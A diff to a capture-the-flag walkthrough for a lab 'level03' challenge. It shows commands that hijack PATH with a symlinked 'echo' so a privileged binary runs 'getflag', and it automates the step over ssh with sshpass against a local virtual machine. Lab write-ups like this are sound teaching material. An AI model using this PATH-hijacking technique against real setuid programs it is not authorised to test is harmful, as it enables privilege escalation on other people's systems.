@@ -83,20 +83,18 @@
 	ln -s $( which getflag ) /tmp/echo
 	```
 
-12. __Action__ (Guest): execute `./level03` with an altered environment
+12. __Action__ (Host): execute `./level03` with an altered environment
 	to make it invoke our `echo` symbolic link instead of the real `echo` command
-	and save the token to a file
+	and save the token in the `flag` file
 	```sh
-	env PATH=/tmp ./level03 | egrep -o '[^ ]+$' >/tmp/token
+	sshpass -f level02/flag 2>/dev/null \
+		ssh -p 4242 level03@192.168.122.214 \
+			env PATH=/tmp \
+				./level03 \
+	| egrep -o '[^ ]+$' >level03/flag
 	```
 
-13. __Action__ (Host): copy the token from the virtual machine
+13. __Action__ (Guest): remove the `echo` symbolic link
 	```sh
-	sshpass -f level02/flag \
-		scp -P 4242 level03@192.168.122.214:/tmp/token level03/flag
-	```
-
-14. __Action__ (Guest): remove the `echo` symbolic link and the `token` file
-	```sh
-	rm /tmp/{'echo','token'}
+	rm /tmp/echo
 	```
